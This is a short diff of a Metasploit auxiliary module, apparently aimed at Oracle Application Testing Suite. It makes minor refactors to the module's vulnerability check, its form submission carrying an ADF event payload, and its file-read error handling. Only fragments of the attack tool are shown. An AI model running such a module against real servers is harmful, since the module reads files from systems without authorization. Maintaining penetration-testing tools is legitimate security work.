@@ -75,7 +75,7 @@ class MetasploitModule < Msf::Auxiliary
   def check
     res = send_request_cgi({
       'method' => 'GET',
-      'uri'    => normalize_uri(target_uri.path, 'olt') + '/'
+      'uri'    => normalize_uri(target_uri.path, 'olt/')
     })
 
     if res.body.include?('AdfLoopbackUtils.runLoopback')
@@ -171,7 +171,7 @@ class MetasploitModule < Msf::Auxiliary
           'javax.faces.ViewState' => auth_spec.view_state,
           'Adf-Page-Id' => auth_spec.adf_page_id,
           'event' => 'btnSubmit',
-          'event.btnSubmit' => %Q|<m xmlns="http://oracle.com/richClient/comm"><k v="type"><s>action</s></k></m>|
+          'event.btnSubmit' => '<m xmlns="http://oracle.com/richClient/comm"><k v="type"><s>action</s></k></m>'
         }
     })
 
@@ -204,7 +204,7 @@ class MetasploitModule < Msf::Auxiliary
     })
 
     fail_with(Failure::Unknown, 'No response from server') unless res
-    fail_with(Failure::Unknown, 'File not found') if res.body.match(/No content to display/)
+    fail_with(Failure::Unknown, 'File not found') if res.body.include?('No content to display')
     res.body
   end
 
